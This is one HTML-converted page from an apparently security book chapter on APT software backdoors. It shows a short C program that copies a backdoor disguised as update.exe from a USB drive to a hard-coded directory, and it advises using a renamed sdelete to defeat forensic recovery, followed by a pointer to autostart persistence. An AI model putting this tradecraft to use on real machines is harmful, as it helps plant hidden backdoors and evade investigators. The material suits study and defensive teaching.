<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml"><head><title/><link rel="stylesheet" href="../css/base.min.css"/><link rel="stylesheet" href="../css/fancy.min.css"/><link rel="stylesheet" href="../css/pdf.css"/><meta name="viewport" content="width=640, height=824"/></head><body><div id="page_body"><div id="pf1ae" class="pf w2 h2" data-page-no="1ae"><div class="pc pc1ae w2 h2"><div class="t m0 x6 h10 y83 ff2 fs2 fc0 sc0 ls8 ws0">Chapter 10: APT Software Backdoors<span class="_ _9"> </span><span class="ff1 fs9 lsa">407</span></div><div class="t m0 x3 h4 y2c9 ff2 fs1 fc0 sc0 ls0 ws0">Backdoor Installer</div><div class="t m0 x3 hd y2ca ff4 fs7 fc0 sc0 ls0 ws0">During some of our scenarios such as the USB or CD deployment, we don’<span class="_ _0"/>t </div><div class="t m0 x3 hd y2cb ff4 fs7 fc0 sc0 ls0 ws0">necessarily need the same dropper functionality of do<span class="_ _0"/>wnloading les; instead, we’ll </div><div class="t m0 x3 hd y2cc ff4 fs7 fc0 sc0 ls0 ws0">need to perform actions such as copying our backdoor to the computer and launching </div><div class="t m0 x3 hd y2cd ff4 fs7 fc0 sc0 ls0 ws0">the ex<span class="_ _0"/>ecutable. <span class="_ _0"/>W<span class="_ _2"/>e can utilize the same ndWritableDirectory function we created </div><div class="t m0 x3 hd y2ce ff4 fs7 fc0 sc0 ls0 ws0">earlier to identify a good target directory<span class="_ _3"/>. <span class="_ _0"/>After that, moving the les is as simple as </div><div class="t m0 x3 hd y52f ff4 fs7 fc0 sc0 ls0 ws0">the follo<span class="_ _0"/>wing example:</div><div class="t m0 x3 h44 y26a6 fff fse fc0 sc0 ls0 ws0">#include &lt;stdio.h&gt;</div><div class="t m0 x3 h44 y26a7 fff fse fc0 sc0 ls0 ws0">#include &lt;stdlib.h&gt;</div><div class="t m0 x3 h44 y26a8 fff fse fc0 sc0 ls0 ws0">#include &lt;windows.h&gt;</div><div class="t m0 x3 h44 y26a9 fff fse fc0 sc0 ls0 ws0">int main(int argc, char *argv[])</div><div class="t m0 x3 h44 y26aa fff fse fc0 sc0 ls0 ws0">{</div><div class="t m0 x3 h44 y26ab fff fse fc0 sc0 ls0 ws0">    char *path="c:\\innocent\\update.exe";</div><div class="t m0 x3 h44 y26ac fff fse fc0 sc0 ls0 ws0">    if( CopyFile( "update.exe", path, FALSE) != 0 )</div><div class="t m0 x3 h44 y26ad fff fse fc0 sc0 ls0 ws0">    {</div><div class="t m0 x3 h44 y26ae fff fse fc0 sc0 ls0 ws0">      printf(“File successfully copied\n”);</div><div class="t m0 x3 h44 y26af fff fse fc0 sc0 ls0 ws0">    }</div><div class="t m0 x3 h44 y26b0 fff fse fc0 sc0 ls0 ws0">  return 0;</div><div class="t m0 x3 h44 y26b1 fff fse fc0 sc0 ls0 ws0">}</div><div class="t m0 x4 hd y26b2 ff4 fs7 fc0 sc0 ls0 ws0">In this example, we’<span class="_ _2"/>re hard-coding the destination directory and le to c:\</div><div class="t m0 x3 hd y26b3 ff4 fs7 fc0 sc0 ls0 ws0">innocent\update.ex<span class="_ _0"/>e and copying the update.e<span class="_ _0"/>xe le from the current directory to that </div><div class="t m0 x3 hd y26b4 ff4 fs7 fc0 sc0 ls0 ws0">path. If this copy has been performed on a USB dri<span class="_ _0"/>ve, then we most lik<span class="_ _0"/>ely want to </div><div class="t m0 x3 hd y26b5 ff4 fs7 fc0 sc0 ls0 ws0">delete the le on the USB dri<span class="_ _0"/>ve. <span class="_ _0"/>W<span class="_ _3"/>e can use the DeleteFile function to delete the le; </div><div class="t m0 x3 hd y26b6 ff4 fs7 fc0 sc0 lsb ws16">ho<span class="_ _0"/>wev<span class="_ _0"/>er<span class="_ _0"/>, a forensic in<span class="_ _2"/>vestigation of the driv<span class="_ _0"/>e would most likely gi<span class="_ _0"/>v<span class="_ _0"/>e an in<span class="_ _0"/>v<span class="_ _0"/>estigator </div><div class="t m0 x3 hd y26b7 ff4 fs7 fc0 sc0 ls0 ws0">easy access to any deleted les.</div><div class="t m0 x4 hd y26b8 ff4 fs7 fc0 sc0 ls0 ws0">Thus, we can cheat a little and do<span class="_ _0"/>wnload the sdelete (Secure Delete) utility from </div><div class="t m0 x3 hd y26b9 ff4 fs7 fc0 sc0 ls0 ws0">Microsoft. <span class="_ _0"/>W<span class="_ _3"/>e can then include this executable—renamed, of course—on the USB </div><div class="t m0 x3 hd y26ba ff4 fs7 fc0 sc0 ls0 ws0">dri<span class="_ _0"/>ve and simply use it to securely delete our les. Of course, a forensic e<span class="_ _0"/>xaminer </div><div class="t m0 x3 hd y26bb ff4 fs7 fc0 sc0 ls0 ws0">would be able to identify the sdelete program, b<span class="_ _0"/>ut the functionality of our backdoor </div><div class="t m0 x3 hd y26bc ff4 fs7 fc0 sc0 ls0 ws0">will remain a secret.</div><div class="t m0 x3 h7 y26bd ff1 fs3 fc0 sc0 ls0 ws0">Backdoor Persistence</div><div class="t m0 x3 hd y26be ff4 fs7 fc0 sc0 ls0 ws0">Many dif<span class="_ _0"/>ferent methods are a<span class="_ _0"/>v<span class="_ _0"/>ailable to us to hav<span class="_ _0"/>e our backdoor autostart. <span class="_ _2"/>A great </div><div class="t m0 x3 hd y26bf ff4 fs7 fc0 sc0 ls0 ws0">way to see all of the autostart locations a<span class="_ _0"/>v<span class="_ _0"/>ailable is with the <span class="_ _0"/>Autoruns tool from </div><div class="t m0 x3 hd y26c0 ff4 fs7 fc0 sc0 ls0 ws0">Microsoft, located at http://technet.microsoft.com/en-us/sysinternals/bb963902.aspx.</div><a class="" href="http://technet.microsoft.com/en-us/sysinternals/bb963902.aspx"><div class="d m1" style="border-style:none;position:absolute;left:208.133031px;bottom:101.635676px;width:279.000000px;height:12.000000px;background-color:rgba(255,255,255,0.000001);"/></a></div><div class="pi" data-data="{&#34;ctm&#34;:[1.209373,0.000000,0.000000,1.209373,0.000000,0.000000]}"/></div></div></body></html>